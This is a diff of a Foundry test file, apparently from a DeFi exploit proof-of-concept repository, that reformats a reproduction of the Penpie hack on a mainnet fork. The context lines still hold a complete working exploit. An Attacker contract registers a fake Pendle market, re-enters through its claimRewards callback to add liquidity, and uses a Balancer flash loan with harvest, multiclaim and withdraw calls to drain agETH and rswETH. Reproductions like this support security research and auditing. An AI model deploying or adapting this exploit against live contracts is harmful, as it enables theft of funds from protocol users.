@@ -24,30 +24,30 @@ contract Penpiexyz_io_exp is Test {
     Attacker attacker;
 
     function setUp() public {
-        vm.createSelectFork("mainnet", 20671878 - 1);
+        vm.createSelectFork("mainnet", 20_671_878 - 1);
     }
-    
+
     function testPoC_A() public {
         attacker = new Attacker();
 
         // First tx: 0x7e7f9548f301d3dd863eac94e6190cb742ab6aa9d7730549ff743bf84cbd21d1
         attacker.createMarket();
-        
+
         // To pass `if (lastRewardBlock != block.number) {` of PendleMarketV3 contract
         vm.roll(block.number + 1);
-        
+
         // Second tx: 0x42b2ec27c732100dd9037c76da415e10329ea41598de453bb0c0c9ea7ce0d8e5
         attacker.attack();
 
-        console.log('Final balance in agETH :', IERC20(agETH).balanceOf(address(attacker)));
-        console.log('Final balance in rswETH:', IERC20(rswETH).balanceOf(address(attacker)));
+        console.log("Final balance in agETH :", IERC20(agETH).balanceOf(address(attacker)));
+        console.log("Final balance in rswETH:", IERC20(rswETH).balanceOf(address(attacker)));
     }
 }
 
 // Minimum contract just to make the hack work
 abstract contract ERC20 {
-    string public name = '';
-    string public symbol = '';
+    string public name = "";
+    string public symbol = "";
     uint8 public immutable decimals = 18;
     mapping(address => uint256) public balanceOf;
 
@@ -62,19 +62,20 @@ abstract contract ERC20 {
 
 contract Attacker is ERC20 {
     address PENDLE_LPT; // Equal to PENDLE_LPT_0x5b6c = 0x5b6c23aedf704D19d6D8e921E638e8AE03cDCa82; of the original hack transaction
-    
+
     uint256 saved_bal;
     uint256 saved_bal1;
     uint256 saved_bal2;
     uint256 saved_value;
 
-    function assetInfo() external view returns(uint8, address, uint8) {
+    function assetInfo() external view returns (uint8, address, uint8) {
         return (0, address(this), 8);
     }
 
     function exchangeRate() external view returns (uint256 res) {
         return 1 ether;
     }
+
     function getRewardTokens() external view returns (address[] memory) {
         if (PENDLE_LPT == msg.sender) {
             address[] memory tokens = new address[](2);
@@ -83,10 +84,14 @@ contract Attacker is ERC20 {
             return tokens;
         }
     }
-    function rewardIndexesCurrent() external returns (uint256[] memory) { }
+
+    function rewardIndexesCurrent() external returns (uint256[] memory) {}
 
     uint256 claimRewardsCall;
-    function claimRewards(address user) external returns (uint256[] memory rewardAmounts) {
+
+    function claimRewards(
+        address user
+    ) external returns (uint256[] memory rewardAmounts) {
         if (claimRewardsCall == 0) {
             claimRewardsCall++;
             return new uint256[](0);
@@ -98,16 +103,16 @@ contract Attacker is ERC20 {
 
             {
                 Interfaces.SwapData memory swapData = Interfaces.SwapData(
-                    Interfaces.SwapType.NONE,// SwapType swapType;
-                    address(0),// address extRouter;
-                    "",// bytes extCalldata;
-                    false// bool needScale;
+                    Interfaces.SwapType.NONE, // SwapType swapType;
+                    address(0), // address extRouter;
+                    "", // bytes extCalldata;
+                    false // bool needScale;
                 );
                 Interfaces.TokenInput memory input = Interfaces.TokenInput(
-                    agETH,// address tokenIn;
-                    bal_agETH,// uint256 netTokenIn;
-                    agETH,// address tokenMintSy;
-                    address(0),// address pendleSwap;
+                    agETH, // address tokenIn;
+                    bal_agETH, // uint256 netTokenIn;
+                    agETH, // address tokenMintSy;
+                    address(0), // address pendleSwap;
                     swapData
                 );
                 Interfaces(PendleRouterV4).addLiquiditySingleTokenKeepYt(
@@ -127,16 +132,16 @@ contract Attacker is ERC20 {
 
             {
                 Interfaces.SwapData memory swapData = Interfaces.SwapData(
-                    Interfaces.SwapType.NONE,// SwapType swapType;
-                    address(0),// address extRouter;
-                    "",// bytes extCalldata;
-                    false// bool needScale;
+                    Interfaces.SwapType.NONE, // SwapType swapType;
+                    address(0), // address extRouter;
+                    "", // bytes extCalldata;
+                    false // bool needScale;
                 );
                 Interfaces.TokenInput memory input = Interfaces.TokenInput(
-                    rswETH,// address tokenIn;
-                    bal_rswETH,// uint256 netTokenIn;
-                    rswETH,// address tokenMintSy;
-                    address(0),// address pendleSwap;
+                    rswETH, // address tokenIn;
+                    bal_rswETH, // uint256 netTokenIn;
+                    rswETH, // address tokenMintSy;
+                    address(0), // address pendleSwap;
                     swapData
                 );
                 (saved_value,,,) = Interfaces(PendleRouterV4).addLiquiditySingleTokenKeepYt(
@@ -157,21 +162,14 @@ contract Attacker is ERC20 {
 
     function createMarket() external {
         (address PT, address YT) =
-            Interfaces(PendleYieldContractFactory).createYieldContract(
-                address(this),
-                1735171200,
-                true
-            );
+            Interfaces(PendleYieldContractFactory).createYieldContract(address(this), 1_735_171_200, true);
         PENDLE_LPT = Interfaces(PendleMarketFactoryV3).createNewMarket(
-            PT,
-            23352202321000000000,
-            1032480618000000000,
-            1998002662000000
+            PT, 23_352_202_321_000_000_000, 1_032_480_618_000_000_000, 1_998_002_662_000_000
         );
         Interfaces(PendleMarketRegisterHelper).registerPenpiePool(PENDLE_LPT);
-        
+
         _mint(address(YT), 1 ether);
-        
+
         Interfaces(YT).mintPY(address(this), address(this));
 
         uint256 bal = IERC20(PT).balanceOf(address(this));
@@ -180,15 +178,11 @@ contract Attacker is ERC20 {
 
         _mint(address(PENDLE_LPT), 1 ether);
 
-        Interfaces(PENDLE_LPT).mint(
-            address(this),
-            1 ether,
-            1 ether
-        );
+        Interfaces(PENDLE_LPT).mint(address(this), 1 ether, 1 ether);
 
         IERC20(PENDLE_LPT).approve(PendleStaking_0x6e79, type(uint256).max);
 
-        Interfaces(PendleMarketDepositHelper_0x1c1f).depositMarket(PENDLE_LPT, 999999999999999000);
+        Interfaces(PendleMarketDepositHelper_0x1c1f).depositMarket(PENDLE_LPT, 999_999_999_999_999_000);
     }
 
     // Second
@@ -202,12 +196,7 @@ contract Attacker is ERC20 {
         amounts[0] = saved_bal1;
         saved_bal2 = IERC20(rswETH).balanceOf(balancerVault);
         amounts[1] = saved_bal2;
-        Interfaces(balancerVault).flashLoan(
-            address(this),
-            tokens,
-            amounts,
-            ''
-        );
+        Interfaces(balancerVault).flashLoan(address(this), tokens, amounts, "");
     }
 
     function receiveFlashLoan(
@@ -218,10 +207,7 @@ contract Attacker is ERC20 {
     ) external {
         address[] memory _markets = new address[](1);
         _markets[0] = PENDLE_LPT;
-        Interfaces(PendleStaking_0x6e79).batchHarvestMarketRewards(
-            _markets,
-            0
-        );
+        Interfaces(PendleStaking_0x6e79).batchHarvestMarketRewards(_markets, 0);
 
         Interfaces(MasterPenpie).multiclaim(_markets);
         Interfaces(PendleMarketDepositHelper_0x1c1f).withdrawMarket(PENDLE_LPT_0x6010, saved_bal);
@@ -231,34 +217,34 @@ contract Attacker is ERC20 {
 
         {
             Interfaces.LimitOrderData memory limit = Interfaces.LimitOrderData(
-                address(0),// address limitRouter;
-                0,// uint256 epsSkipMarket; // only used for swap operations, will be ignored otherwise
-                new Interfaces.FillOrderParams[](0),// FillOrderParams[] normalFills;
-                new Interfaces.FillOrderParams[](0),// FillOrderParams[] flashFills;
-                ''// bytes optData;
+                address(0), // address limitRouter;
+                0, // uint256 epsSkipMarket; // only used for swap operations, will be ignored otherwise
+                new Interfaces.FillOrderParams[](0), // FillOrderParams[] normalFills;
+                new Interfaces.FillOrderParams[](0), // FillOrderParams[] flashFills;
+                "" // bytes optData;
             );
 
             Interfaces.SwapData memory swapData = Interfaces.SwapData(
-                Interfaces.SwapType.NONE,// SwapType swapType;
-                address(0),// address extRouter;
-                "",// bytes extCalldata;
-                false// bool needScale;
+                Interfaces.SwapType.NONE, // SwapType swapType;
+                address(0), // address extRouter;
+                "", // bytes extCalldata;
+                false // bool needScale;
             );
 
             Interfaces.TokenOutput memory output = Interfaces.TokenOutput(
-                agETH,//address tokenOut;
-                0,//uint256 minTokenOut;
-                agETH,//address tokenRedeemSy;
-                address(0),//address pendleSwap;
-                swapData//SwapData swapData;
+                agETH, //address tokenOut;
+                0, //uint256 minTokenOut;
+                agETH, //address tokenRedeemSy;
+                address(0), //address pendleSwap;
+                swapData //SwapData swapData;
             );
 
             Interfaces(PendleRouterV4).removeLiquiditySingleToken(
-                address(this),//address receiver,
-                PENDLE_LPT_0x6010,//address market,
-                bal_this,//uint256 netLpToRemove,
-                output,//TokenOutput calldata output,
-                limit//LimitOrderData calldata limit
+                address(this), //address receiver,
+                PENDLE_LPT_0x6010, //address market,
+                bal_this, //uint256 netLpToRemove,
+                output, //TokenOutput calldata output,
+                limit //LimitOrderData calldata limit
             );
         }
 
@@ -266,37 +252,37 @@ contract Attacker is ERC20 {
 
         uint256 bal_PENDLE_LPT_0x038c = IERC20(PENDLE_LPT_0x038c).balanceOf(address(this));
         IERC20(PENDLE_LPT_0x038c).approve(PendleRouterV4, bal_PENDLE_LPT_0x038c);
-            
+
         {
             Interfaces.LimitOrderData memory limit = Interfaces.LimitOrderData(
-                address(0),// address limitRouter;
-                0,// uint256 epsSkipMarket; // only used for swap operations, will be ignored otherwise
-                new Interfaces.FillOrderParams[](0),// FillOrderParams[] normalFills;
-                new Interfaces.FillOrderParams[](0),// FillOrderParams[] flashFills;
-                ''// bytes optData;
+                address(0), // address limitRouter;
+                0, // uint256 epsSkipMarket; // only used for swap operations, will be ignored otherwise
+                new Interfaces.FillOrderParams[](0), // FillOrderParams[] normalFills;
+                new Interfaces.FillOrderParams[](0), // FillOrderParams[] flashFills;
+                "" // bytes optData;
             );
 
             Interfaces.SwapData memory swapData = Interfaces.SwapData(
-                Interfaces.SwapType.NONE,// SwapType swapType;
-                address(0),// address extRouter;
-                "",// bytes extCalldata;
-                false// bool needScale;
+                Interfaces.SwapType.NONE, // SwapType swapType;
+                address(0), // address extRouter;
+                "", // bytes extCalldata;
+                false // bool needScale;
             );
 
             Interfaces.TokenOutput memory output = Interfaces.TokenOutput(
-                rswETH,//address tokenOut;
-                0,//uint256 minTokenOut;
-                rswETH,//address tokenRedeemSy;
-                address(0),//address pendleSwap;
-                swapData//SwapData swapData;
+                rswETH, //address tokenOut;
+                0, //uint256 minTokenOut;
+                rswETH, //address tokenRedeemSy;
+                address(0), //address pendleSwap;
+                swapData //SwapData swapData;
             );
 
             Interfaces(PendleRouterV4).removeLiquiditySingleToken(
-                address(this),//address receiver,
-                PENDLE_LPT_0x038c,//address market,
-                bal_PENDLE_LPT_0x038c,//uint256 netLpToRemove,
-                output,//TokenOutput calldata output,
-                limit//LimitOrderData calldata limit
+                address(this), //address receiver,
+                PENDLE_LPT_0x038c, //address market,
+                bal_PENDLE_LPT_0x038c, //uint256 netLpToRemove,
+                output, //TokenOutput calldata output,
+                limit //LimitOrderData calldata limit
             );
         }
 
@@ -324,13 +310,12 @@ interface Interfaces {
     ) external returns (address market);
 
     // PendleMarketRegisterHelper
-    function registerPenpiePool(address _market) external;
+    function registerPenpiePool(
+        address _market
+    ) external;
 
     // PendleYieldToken
-    function mintPY(
-        address receiverPT,
-        address receiverYT
-    ) external returns (uint256 amountPYOut);
+    function mintPY(address receiverPT, address receiverYT) external returns (uint256 amountPYOut);
 
     // PendleMarketV3
     function mint(
@@ -338,8 +323,10 @@ interface Interfaces {
         uint256 netSyDesired,
         uint256 netPtDesired
     ) external returns (uint256 netLpOut, uint256 netSyUsed, uint256 netPtUsed);
-    
-    function redeemRewards(address user) external returns (uint256[] memory);
+
+    function redeemRewards(
+        address user
+    ) external returns (uint256[] memory);
 
     // PendleMarketDepositHelper_0x1c1f
     function depositMarket(address _market, uint256 _amount) external;
@@ -363,18 +350,13 @@ interface Interfaces {
         bool isActive;
     }
 
-    function pools(address) external view returns(Pool memory);
+    function pools(
+        address
+    ) external view returns (Pool memory);
 
-    function batchHarvestMarketRewards(
-        address[] calldata _markets,
-        uint256 minEthToRecieve
-    ) external;
+    function batchHarvestMarketRewards(address[] calldata _markets, uint256 minEthToRecieve) external;
 
-    function harvestMarketReward(
-        address _market,
-        address _caller,
-        uint256 _minEthRecive
-    ) external;
+    function harvestMarketReward(address _market, address _caller, uint256 _minEthRecive) external;
 
     // PendleRouterV4
     enum SwapType {
@@ -406,7 +388,7 @@ interface Interfaces {
         uint256 minYtOut,
         TokenInput calldata input
     ) external payable returns (uint256 netLpOut, uint256 netYtOut, uint256 netSyMintPy, uint256 netSyInterm);
-    
+
     enum OrderType {
         SY_FOR_PT,
         PT_FOR_SY,
@@ -442,6 +424,7 @@ interface Interfaces {
         FillOrderParams[] flashFills;
         bytes optData;
     }
+
     struct TokenOutput {
         address tokenOut;
         uint256 minTokenOut;
